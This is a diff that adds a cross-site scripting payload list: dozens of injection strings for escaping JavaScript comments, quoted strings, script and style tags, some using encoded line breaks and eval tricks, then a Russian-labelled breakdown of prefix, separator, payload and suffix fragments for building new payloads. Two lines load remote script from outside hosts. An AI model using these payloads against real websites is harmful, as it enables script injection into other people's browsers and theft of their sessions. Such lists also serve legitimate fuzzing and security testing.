@@ -1,0 +1,73 @@
+*/  alert('XSS');  /*
+\";   alert('XSS');  //
+%0d  alert(1);
+});alert('XSS');</script>
+});</script><script>alert('XSS')</script>
+onclick=alert('XSS');
+';alert('XSS');//
+\';alert('XSS');//
+";alert('XSS');//
+</SCRIPT><SCRIPT>alert('XSS');</SCRIPT>
+"><SCRIPT>alert('XSS');</SCRIPT>
+'><SCRIPT>alert('XSS');</SCRIPT>
+"); alert('XSS');
+;alert('XSS');;
+}; alert('XSS');
+1;alert('XSS');
+1];alert('XSS');//
+];alert('XSS');//
+'];alert('XSS');//
+'};alert('XSS');//
+;//%0dalert('XSS');//
+';//%0dalert('XSS');//
+
+xyz onerror=alert(6);
+1;a=eval;b=alert;a(b(/XSS/.source));
+1];a=eval;b=alert;a(b(XSS));//
+\";alert('XSS');//
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://hackers.com/xss.js"></SCRIPT>
++alert('XSS')+
+0%0d%0a%00<script src=//h4k.in>
+}</style><script>a=eval;b=alert;a(b(/i/.source));</script>
+
+
+
+
+
+
+
+По частям:
+Начало:
+""
+*/
+\"
+}
+)
+)}
+})
+'
+</script><script>
+'>
+">
+")
+1
+1]
+]
+']
+'}
+полторашка:
+;
+Вторая часть:
+""
+<script>
+</script><script>
+%0d
+//
+
+Пэйлоад:
+alert('XSS');
+
+завершение:
+/*
+//
+</script>
